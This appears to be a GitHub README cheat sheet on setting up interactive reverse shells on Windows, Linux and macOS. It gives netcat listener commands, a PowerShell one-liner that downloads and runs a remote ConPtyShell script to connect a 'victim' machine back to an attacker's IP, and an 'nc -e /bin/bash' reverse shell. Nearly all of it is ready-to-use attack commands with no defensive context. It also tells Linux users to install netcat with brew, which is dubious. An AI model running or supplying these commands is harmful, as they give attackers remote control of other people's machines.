# Fully-Interactive-Reverse-Shell
## Netcat ~ "the Swiss army knife of networking"

## For Windows:

ConPtyShell- a Fully Interactive Reverse Shell for Windows systems.
## Requirements
Client Side: Windows version >= 10 / 2019 1809 (build >= 10.0.17763)
Server Side: any tcp listener, i.e. netcat

#### Via Powershell
## Procedure-
#### Server Side:
```
stty raw -echo; (stty size; cat) | nc -lvnp "port" -s "ip"
```
```
example : stty raw -echo; (stty size; cat) | nc -lvnp 88 -s 10.0.0.2
```
#### Client Side:
```
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell "ip" "port"
```
#### NOTE: 
For client/victim side~ Command should be initiated in powershell, not cmd
```
example : IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.1 88
```

## For Linux
## Requirements
ClientSide : linux with netcat installed(most linux have nc)
ServerSide : any tcp listener like, i.e. netcat (prefered machine - Kali/Parrot OS)

Note: if client side netcat is not installed, use :
```
brew install netcat
```

#### For mac :
Use-
```
brew install netcat
```
#### Via terminal
## Procedure-
#### Server Side:
```
nc -lnvp "port" -s "ip"
```
#### Client Side:
```
nc -e /bin/bash "ip" "port"
```
